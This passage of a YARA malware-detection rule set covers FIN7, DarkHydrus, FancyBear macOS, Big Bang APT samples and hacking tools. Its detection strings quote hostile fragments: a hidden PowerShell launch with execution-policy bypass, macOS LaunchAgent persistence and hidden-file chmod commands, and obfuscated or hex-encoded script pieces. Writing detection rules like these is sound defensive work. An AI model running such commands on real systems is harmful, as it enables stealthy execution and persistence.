\"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html\"\n      date = \"2018-08-01 11:22:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"1513c7630c981e4b1d0d5a55809166721df4f87bb0fac2d2b8ff6afae187f01d\"\n      tags = \"APT, DEMO, FILE, G0046, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Description: C:\\\\Users\\\\oleg\\\\Desktop\\\\\" wide\n      $x2 = \"/*|*| *  Copyright 2016 Microsoft, Industries.|*| *  All rights reserved.|*|\" ascii\n      $x3 = \"32, 40, 102, 105, 108, 101, 95, 112, 97, 116, 104, 41, 41, 32\" ascii\n      $x4 = \"83, 108, 101, 101, 112, 40, 51, 48, 48, 48, 41, 59, 102, 115\" ascii\n      $x5 = \"80, 80, 68, 65, 84, 65, 37, 34, 41, 44, 115, 104, 101, 108, 108\" ascii\n   condition: \n      uint16 ( 0 ) == 0xcfd0 and filesize < 2000KB and 1 of them\n}\n\nrule APT_FIN7_MalDoc_Aug18_1_RID2E6D : APT DEMO G0046 RUSSIA {\n   meta:\n      description = \"Detects malicious Doc from FIN7 campaign\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html\"\n      date = \"2018-08-01 11:14:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9c12591c850a2d5355be0ed9b3891ccb3f42e37eaf979ae545f2f008b5d124d6\"\n      tags = \"APT, DEMO, G0046, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<photoshop:LayerText>If this document was downloaded from your email, please click  \\\"Enable editing\\\" from the yellow bar above\" ascii\n   condition: \n      filesize < 800KB and 1 of them\n}\n\nrule APT_FIN7_Sample_Aug18_1_RID2E9F : APT DEMO FILE G0046 RUSSIA T1057 {\n   meta:\n      description = \"Detects FIN7 samples mentioned in FireEye report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html\"\n      date = \"2018-08-01 11:22:21\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a1e95ac1bb684186e9fb5c67f75c7c26ddc8b18ebfdaf061742ddf1675e17d55\"\n      hash2 = \"dc645aae5d283fa175cf463a19615ed4d16b1d5238686245574d8a6a8b0fc8fa\"\n      hash3 = \"eebbce171dab636c5ac0bf0fd14da0e216758b19c0ce2e5c572d7e6642d36d3d\"\n      tags = \"APT, DEMO, FILE, G0046, RUSSIA, T1057\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\par var console=\\\\{\\\\};console.log=function()\\\\{\\\\};\" ascii\n      $s2 = \"616e64792d7063\" ascii\n      $x1 = \"0043003a005c00550073006500720073005c0061006e00640079005c004400650073006b0074006f0070005c0075006e00700072006f0074006500630074\" ascii\n      $x2 = \"780065006300750074006500280022004f006e0020004500720072006f007200200052006500730075006d00650020004e006500780074003a0073006500\" ascii\n      $x3 = \"\\\\par \\\\tab \\\\tab \\\\tab sh.Run \\\"powershell.exe -NoE -NoP -NonI -ExecutionPolicy Bypass -w Hidden -File \\\" & pToPSCb, 0, False\" fullword ascii\n      $x4 = \"002e006c006e006b002d00000043003a005c00550073006500720073005c007400650073007400610064006d0069006e002e0054004500530054005c0044\" ascii\n      $x5 = \"005c00550073006500720073005c005400450053005400410044007e0031002e005400450053005c0041007000700044006100740061005c004c006f0063\" ascii\n      $x6 = \"6c00690063006100740069006f006e002200220029003a00650078006500630075007400650020007700700072006f0074006500630074002e0041006300\" ascii\n      $x7 = \"7374656d33325c6d736874612e657865000023002e002e005c002e002e005c002e002e005c00570069006e0064006f00770073005c005300790073007400\" ascii\n      $x8 = \"\\\\par \\\\tab \\\\tab sh.Run \\\"%comspec% /c tasklist >\\\"\\\"\\\" & tpath & \\\"\\\"\\\" 2>&1\\\", 0, true\" fullword ascii\n      $x9 = \"00720079007b006500760061006c0028002700770061006c006c003d004700650074004f0062006a0065006300740028005c005c0027005c005c00270027\" ascii\n      $x10 = \"006e00640079005c004400650073006b0074006f0070005c0075006e006c006f0063006b002e0064006f0063002e006c006e006b\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5c7b and filesize < 3000KB and ( 1 of ( $x* ) or 2 of them )\n}\n\nrule APT_FIN7_EXE_Sample_Aug18_1_RID2FE0 : APT DEMO EXE FILE G0046 RUSSIA {\n   meta:\n      description = \"Detects sample from FIN7 report in August 2018\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html\"\n      date = \"2018-08-01 12:15:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7f16cbe7aa1fbc5b8a95f9d123f45b7e3da144cb88db6e1da3eca38cf88660cb\"\n      tags = \"APT, DEMO, EXE, FILE, G0046, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Manche Enterprises Limited0\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and 1 of them\n}\n\nrule APT_FIN7_EXE_Sample_Aug18_2_RID2FE1 : APT DEMO EXE FILE G0046 RUSSIA {\n   meta:\n      description = \"Detects sample from FIN7 report in August 2018\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html\"\n      date = \"2018-08-01 12:16:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"60cd98fc4cb2ae474e9eab81cd34fd3c3f638ad77e4f5d5c82ca46f3471c3020\"\n      tags = \"APT, DEMO, EXE, FILE, G0046, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"constructor or from DllMain.\" fullword ascii\n      $s2 = \"Network Software Ltd0\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them\n}\n\nrule APT_FIN7_EXE_Sample_Aug18_3_RID2FE2 : APT DEMO EXE FILE G0046 RUSSIA {\n   meta:\n      description = \"Detects sample from FIN7 report in August 2018\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html\"\n      date = \"2018-08-01 12:16:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"995b90281774798a376db67f906a126257d314efc21b03768941f2f819cf61a6\"\n      tags = \"APT, DEMO, EXE, FILE, G0046, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cvzdfhtjkdhbfszngjdng\" fullword ascii\n      $s2 = \"sdfkjdfjfhgurgvncmnvmfdjdkfjdkfjdf\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and 1 of them\n}\n\nrule APT_FIN7_EXE_Sample_Aug18_4_RID2FE3 : APT DEMO EXE FILE G0046 RUSSIA {\n   meta:\n      description = \"Detects sample from FIN7 report in August 2018\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html\"\n      date = \"2018-08-01 12:16:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4b5405fc253ed3a89c770096a13d90648eac10a7fb12980e587f73483a07aa4c\"\n      tags = \"APT, DEMO, EXE, FILE, G0046, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"c:\\\\file.dat\" fullword wide\n      $s2 = \"constructor or from DllMain.\" fullword ascii\n      $s3 = \"lineGetCallIDs\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and all of them\n}\n\nrule APT_FIN7_EXE_Sample_Aug18_5_RID2FE4 : APT DEMO EXE FILE G0046 RUSSIA {\n   meta:\n      description = \"Detects sample from FIN7 report in August 2018\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html\"\n      date = \"2018-08-01 12:16:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7789a3d7d05c30b4efaf3f2f5811804daa56d78a9a660968a4f1f9a78a9108a0\"\n      tags = \"APT, DEMO, EXE, FILE, G0046, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"x0=%d, y0=%d, x1=%d, y1=%d\" fullword ascii\n      $s3 = \"sdfkjdfjfhgurgvncmnvmfdjdkfjdkfjdf\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them\n}\n\nrule APT_FIN7_EXE_Sample_Aug18_6_RID2FE5 : APT DEMO EXE FILE G0046 RUSSIA {\n   meta:\n      description = \"Detects sample from FIN7 report in August 2018\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html\"\n      date = \"2018-08-01 12:16:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"1439d301d931c8c4b00717b9057b23f0eb50049916a48773b17397135194424a\"\n      tags = \"APT, DEMO, EXE, FILE, G0046, RUSSIA\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.0.0\"\n      \n   strings:\n      $s1 = \"coreServiceShell.exe\" fullword ascii\n      $s2 = \"PtSessionAgent.exe\" fullword ascii\n      $s3 = \"TiniMetI.exe\" fullword ascii\n      $s4 = \"PwmSvc.exe\" fullword ascii\n      $s5 = \"uiSeAgnt.exe\" fullword ascii\n      $s7 = \"LHOST:\" fullword ascii\n      $s8 = \"TRANSPORT:\" fullword ascii\n      $s9 = \"LPORT:\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 20KB and ( pe.exports ( \"TiniStart\" ) or 4 of them )\n}\n\nrule APT_FIN7_EXE_Sample_Aug18_7_RID2FE6 : APT DEMO EXE FILE G0046 RUSSIA {\n   meta:\n      description = \"Detects sample from FIN7 report in August 2018\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html\"\n      date = \"2018-08-01 12:16:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ce8ce35f85406cd7241c6cc402431445fa1b5a55c548cca2ea30eeb4a423b6f0\"\n      tags = \"APT, DEMO, EXE, FILE, G0046, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"libpng version\" fullword ascii\n      $s2 = \"sdfkjdfjfhgurgvncmnvmfdjdkfjdkfjdf\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and all of them\n}\n\nrule APT_FIN7_EXE_Sample_Aug18_8_RID2FE7 : APT DEMO EXE FILE G0046 RUSSIA {\n   meta:\n      description = \"Detects sample from FIN7 report in August 2018\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html\"\n      date = \"2018-08-01 12:17:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d8bda53d7f2f1e4e442a0e1c30a20d6b0ac9c6880947f5dd36f78e4378b20c5c\"\n      tags = \"APT, DEMO, EXE, FILE, G0046, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"GetL3st3rr\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and all of them\n}\n\nrule APT_FIN7_EXE_Sample_Aug18_10_RID3010 : APT DEMO EXE FILE G0046 RUSSIA {\n   meta:\n      description = \"Detects sample from FIN7 report in August 2018\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html\"\n      date = \"2018-08-01 12:23:51\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"8cc02b721683f8b880c8d086ed055006dcf6155a6cd19435f74dd9296b74f5fc\"\n      tags = \"APT, DEMO, EXE, FILE, G0046, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $c1 = { 00 4C 00 65 00 67 00 61 00 6C 00 43 00 6F 00 70\n               00 79 00 72 00 69 00 67 00 68 00 74 00 00 00 43\n               00 6F 00 70 00 79 00 72 00 69 00 67 00 68 00 74\n               00 20 00 31 00 20 00 2D 00 20 00 31 00 39 00 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 1 of them\n}\n\nrule APT_FIN7_Sample_EXE_Aug18_1_RID2FE0 : APT DEMO EXE FILE G0046 RUSSIA {\n   meta:\n      description = \"Detects FIN7 Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html\"\n      date = \"2018-08-01 12:15:51\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"608003c2165b0954f396d835882479f2504648892d0393f567e4a4aa90659bf9\"\n      hash2 = \"deb62514704852ccd9171d40877c59031f268db917c23d00a2f0113dab79aa3b\"\n      hash3 = \"16de81428a034c7b2636c4a875809ab62c9eefcd326b50c3e629df3b141cc32b\"\n      tags = \"APT, DEMO, EXE, FILE, G0046, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"x0=%d, y0=%d, x1=%d, y1=%d\" fullword ascii\n      $s2 = \"dx=%d, dy=%d\" fullword ascii\n      $s3 = \"Error with JP2H box size\" fullword ascii\n      $co1 = { 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n               00 00 00 00 00 00 00 00 00 00 00 2E 63 6F 64 65\n               00 00 00 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of ( $s* ) and $co1 at 0x015D\n}\n\nrule APT_DarkHydrus_Jul18_1_RID2ED9 : APT DEMO EXE FILE G0079 MIDDLE_EAST {\n   meta:\n      description = \"Detects strings found in malware samples in APT report in DarkHydrus\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/07/unit42-new-threat-actor-group-darkhydrus-targets-middle-east-government/\"\n      date = \"2018-07-28 11:32:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"99541ab28fc3328e25723607df4b0d9ea0a1af31b58e2da07eff9f15c4e6565c\"\n      tags = \"APT, DEMO, EXE, FILE, G0079, MIDDLE_EAST\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"Z:\\\\devcenter\\\\aggressor\\\\\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( pe.imphash ( ) == \"d3666d1cde4790b22b44ec35976687fb\" or 1 of them )\n}\n\nrule APT_DarkHydrus_Jul18_2_RID2EDA : APT DEMO EXE FILE G0079 MIDDLE_EAST {\n   meta:\n      description = \"Detects strings found in malware samples in APT report in DarkHydrus\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/07/unit42-new-threat-actor-group-darkhydrus-targets-middle-east-government/\"\n      date = \"2018-07-28 11:32:11\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"b2571e3b4afbce56da8faa726b726eb465f2e5e5ed74cf3b172b5dd80460ad81\"\n      tags = \"APT, DEMO, EXE, FILE, G0079, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"windir\" fullword ascii\n      $s6 = \"temp.dll\" fullword ascii\n      $s7 = \"libgcj-12.dll\" fullword ascii\n      $s8 = \"%s\\\\System32\\\\%s\" fullword ascii\n      $s9 = \"StartW\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and all of them\n}\n\nrule APT_DarkHydrus_Jul18_3_RID2EDB : APT DEMO EXE FILE G0079 MIDDLE_EAST {\n   meta:\n      description = \"Detects strings found in malware samples in APT report in DarkHydrus\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/07/unit42-new-threat-actor-group-darkhydrus-targets-middle-east-government/\"\n      date = \"2018-07-28 11:32:21\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c8b3d4b6acce6b6655e17255ef7a214651b7fc4e43f9964df24556343393a1a3\"\n      tags = \"APT, DEMO, EXE, FILE, G0079, MIDDLE_EAST\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s2 = \"Ws2_32.dll\" fullword ascii\n      $s3 = \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( pe.imphash ( ) == \"478eacfbe2b201dabe63be53f34148a5\" or all of them )\n}\n\nrule HKTL_Unlicensed_CobaltStrike_EICAR_Jul18_5_RID361D : APT COBALTSTRIKE DEMO EXE FILE G0079 HKTL MIDDLE_EAST S0154 T1550_002 {\n   meta:\n      description = \"Detects strings found in malware samples in APT report in DarkHydrus\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/07/unit42-new-threat-actor-group-darkhydrus-targets-middle-east-government/\"\n      date = \"2018-07-28 16:42:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2020-10-13\"\n      hash1 = \"cec36e8ed65ac6f250c05b4a17c09f58bb80c19b73169aaf40fa15c8d3a9a6a1\"\n      tags = \"APT, COBALTSTRIKE, DEMO, EXE, FILE, G0079, HKTL, MIDDLE_EAST, S0154, T1550_002\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" \n      $s1 = \"X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\" fullword ascii\n      $s2 = \"libgcj-12.dll\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 900KB and ( pe.imphash ( ) == \"829da329ce140d873b4a8bde2cbfaa7e\" or all of ( $s* ) or $x1 )\n}\n\nrule SUSP_BAT2EXE_BDargo_Converted_BAT_RID3273 : DEMO EXE FILE SCRIPT SUSP {\n   meta:\n      description = \"Detects binaries created with BDARGO Advanced BAT to EXE converter\"\n      author = \"Florian Roth\"\n      reference = \"https://www.majorgeeks.com/files/details/advanced_bat_to_exe_converter.html\"\n      date = \"2018-07-28 14:05:41\"\n      score = 45\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-06-23\"\n      hash1 = \"d428d79f58425d831c2ee0a73f04749715e8c4dd30ccd81d92fe17485e6dfcda\"\n      hash1 = \"d428d79f58425d831c2ee0a73f04749715e8c4dd30ccd81d92fe17485e6dfcda\"\n      tags = \"DEMO, EXE, FILE, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Error #bdembed1 -- Quiting\" fullword ascii\n      $s2 = \"%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s\" fullword ascii\n      $s3 = \"\\\\a.txt\" ascii\n      $s4 = \"command.com\" fullword ascii\n      $s6 = \"DFDHERGDCV\" fullword ascii\n      $s7 = \"DFDHERGGZV\" fullword ascii\n      $s8 = \"%s%s%s%s%s%s%s%s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 5 of them\n}\n\nrule HKTL_beRootexe_RID2C50 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects beRoot.exe which checks common Windows missconfigurations\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/AlessandroZ/BeRoot/tree/master/Windows\"\n      date = \"2018-07-25 09:43:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"865b3b8ec9d03d3475286c3030958d90fc72b21b0dca38e5bf8e236602136dd7\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"checks.webclient.secretsdump(\" ascii\n      $s2 = \"beroot.modules\" fullword ascii\n      $s3 = \"beRoot.exe.manifest\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 18000KB and 1 of them )\n}\n\nrule HKTL_beRootexe_output_RID2F60 : DEMO HKTL {\n   meta:\n      description = \"Detects the output of beRoot.exe\"\n      author = \"Tobias Michalski\"\n      reference = \"https://github.com/AlessandroZ/BeRoot/tree/master/Windows\"\n      date = \"2018-07-25 11:54:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"permissions: {'change_config'\" fullword wide\n      $s2 = \"Full path: C:\\\\Windows\\\\system32\\\\msiexec.exe /V\" fullword wide\n      $s3 = \"Full path: C:\\\\Windows\\\\system32\\\\svchost.exe -k DevicesFlow\" fullword wide\n      $s4 = \"! BANG BANG !\" fullword wide\n   condition: \n      filesize < 400KB and 3 of them\n}\n\nrule SUSP_PDF_Embedded_Jul18_RID2EF1 : DEMO FILE HKTL SUSP T1203 T1566_001 {\n   meta:\n      description = \"Detects PDFs with embedded files which can start malicious content\"\n      author = \"Tobias Michalski\"\n      reference = \"https://twitter.com/infosecn1nja/status/1021399595899731968?s=12\"\n      date = \"2018-07-25 11:36:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-09-01\"\n      tags = \"DEMO, FILE, HKTL, SUSP, T1203, T1566_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"/Type /Action\\n /S /JavaScript\\n /JS (this.exportDataObject({\" fullword ascii\n      $s1 = \"(This PDF document embeds file\" fullword ascii\n      $s2 = \"/Names << /EmbeddedFiles << /Names\" fullword ascii\n      $s3 = \"/Type /EmbeddedFile\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5025 and 2 of ( $s* ) and $x1\n}\n\nrule MAL_OSX_FancyBear_Agent_Jul18_1_RID31DF : DEMO FILE G0007 MACOS MAL T1543_001 T1569_001 {\n   meta:\n      description = \"Detects FancyBear Agent for OSX\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/DrunkBinary/status/1018448895054098432\"\n      date = \"2018-07-15 13:41:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d3be93f6ce59b522ff951cef9d59ef347081ffe33d4203cd5b5df0aaa9721aa2\"\n      tags = \"DEMO, FILE, G0007, MACOS, MAL, T1543_001, T1569_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"/Users/kazak/Desktop/\" ascii\n      $s1 = \"launchctl load -w ~/Library/LaunchAgents/com.apple.updates.plist\" fullword ascii\n      $s2 = \"mkdir -p /Users/Shared/.local/ &> /dev/null\" fullword ascii\n      $s3 = \"chmod 755 /Users/Shared/start.sh\" fullword ascii\n      $s4 = \"chmod 755 %s/%s &> /dev/null\" fullword ascii\n      $s6 = \"chmod 755 /Users/Shared/.local/kextd\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0xfacf and filesize < 3000KB and ( 1 of ( $x* ) and 4 of them )\n}\n\nrule APT_ME_BigBang_Gen_Jul18_1_RID2FCC : APT DEMO EXE FILE G1028 GEN MIDDLE_EAST {\n   meta:\n      description = \"Detects malware from Big Bang campaign against Palestinian authorities\"\n      author = \"Florian Roth\"\n      reference = \"https://research.checkpoint.com/apt-attack-middle-east-big-bang/\"\n      date = \"2018-07-09 12:12:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4db68522600f2d8aabd255e2da999a9d9c9f1f18491cfce9dadf2296269a172b\"\n      hash2 = \"ac6462e9e26362f711783b9874d46fefce198c4c3ca947a5d4df7842a6c51224\"\n      hash3 = \"e1f52ea30d25289f7a4a5c9d15be97c8a4dfe10eb68ac9d031edcc7275c23dbc\"\n      tags = \"APT, DEMO, EXE, FILE, G1028, GEN, MIDDLE_EAST\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x2 = \"%@W@%S@c@ri%@p@%t.S@%he@%l%@l\" ascii\n      $x3 = \"S%@h%@e%l%@l.\" ascii\n      $x4 = \"(\\\"S@%t@%a%@rt%@up\\\")\" ascii\n      $x5 = \"aW5zdGFsbCBwcm9nOiBwcm9nIHdpbGwgZGVsZXRlIG9sZCB0bXAgZmlsZQ==\" fullword ascii\n      $x6 = \"aW5zdGFsbCBwcm9nOiBUaGVyZSBpcyBubyBvbGQgZmlsZSBpbiB0ZW1wLg==\" fullword ascii\n      $x7 = \"VXBkYXRlIHByb2c6IFRoZXJlIGlzIG5vIG9sZCBmaWxlIGluIHRlbXAu\" fullword ascii\n      $x8 = \"aW5zdGFsbCBwcm9nOiBDcmVhdGUgVGFzayBhZnRlciA1IG1pbiB0byBydW4gRmlsZSBmcm9tIHRtcA==\" fullword ascii\n      $x9 = \"UnVuIEZpbGU6IE15IHByb2cgaXMgRXhpdC4=\" fullword ascii\n      $x10 = \"li%@%@nk.W%@%@indo@%%@%@%wS%@%@tyle = 3\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and ( 1 of them or pe.imphash ( ) == \"0f09ea2a68d04f331df9a5d0f8641332\" )\n}\n\nrule APT_ME_BigBang_Mal_Jul18_1_RID2FCC : APT DEMO EXE FILE G1028 MAL MIDDLE_EAST {\n   meta:\n      description = \"Detects malware from Big Bang report\"\n      author = \"Florian Roth\"\n      reference = \"https://research.checkpoint.com/apt-attack-middle-east-big-bang/\"\n      date = \"2018-07-09 12:12:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ac6462e9e26362f711783b9874d46fefce198c4c3ca947a5d4df7842a6c51224\"\n      hash2 = \"e1f52ea30d25289f7a4a5c9d15be97c8a4dfe10eb68ac9d031edcc7275c23dbc\"\n      tags = \"APT, DEMO, EXE, FILE, G1028, MAL, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%Y%m%d-%I-%M-%S\" fullword ascii\n      $s2 = \"/api/serv/requests/%s/runfile/delete\" fullword ascii\n      $s3 = \"\\\\part.txt\" ascii\n      $s4 = \"\\\\ALL.txt\" ascii\n      $s5 = \"\\\\sat.txt\" ascii\n      $s6 = \"runfile.proccess_name\" fullword ascii\n      $s7 = \"%s%s%p%s%zd%s%d%s%s%s%s%s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 4 of them\n}\n\nrule PUA_LNX_XMRIG_CryptoMiner_RID3009 : DEMO FILE LINUX MAL {\n   meta:\n      description = \"Detects XMRIG CryptoMiner 